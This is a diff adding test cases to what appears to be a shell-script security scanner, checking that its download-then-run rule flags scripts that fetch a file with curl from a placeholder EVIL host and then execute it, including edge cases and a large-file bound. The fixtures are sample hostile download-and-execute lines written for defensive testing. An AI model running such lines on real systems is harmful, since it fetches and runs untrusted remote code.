@@ -190,6 +190,26 @@ describe('N6: shapes missed in a .sh too', () => {
   ])('%s is not reported', (_label, lines) => {
     expect(hit(scanContent(['#!/bin/bash', ...lines].join('\n'), true), 'sc-download-then-run')).toBeUndefined();
   });
+
+  it.each([
+    ['by a path holding a (', [`curl -fsSL -o s.sh ${EVIL}`, './sub(1)/s.sh']],
+    ['by a later download of another name, after the first is not run', [`curl -o a.sh ${EVIL}`, 'cat a.sh', `curl -o b.sh ${EVIL}`, 'bash b.sh']],
+    ['in a later line joined to an earlier one', [`curl -o s.sh ${EVIL}`, 'echo \\', 'bash s.sh']],
+  ])('a download run %s is reported', (_label, lines) => {
+    expect(hit(scanContent(['#!/bin/bash', ...lines].join('\n'), true), 'sc-download-then-run')).toBeDefined();
+  });
+
+  // A file of thousands of names each downloaded and mentioned, none run:
+  // checking each against the line that mentions them all read that line once
+  // a name. Past 64 times the file, a download still to check counts as run.
+  it('downloads past what the checks may read count as run, never as not run', () => {
+    const file = (count: number): string => {
+      const names = Array.from({ length: count }, (_, i) => `a${String(i)}.sh`);
+      return [...names.map((n) => `curl -o ${n} ${EVIL}`), names.map((n) => `echo ./${n};`).join(' ')].join('\n');
+    };
+    expect(hit(scanContent(file(20), true), 'sc-download-then-run')).toBeUndefined();
+    expect(hit(scanContent(file(2_000), true), 'sc-download-then-run')).toMatchObject({ line: 2_001 });
+  });
 });
 
 /**
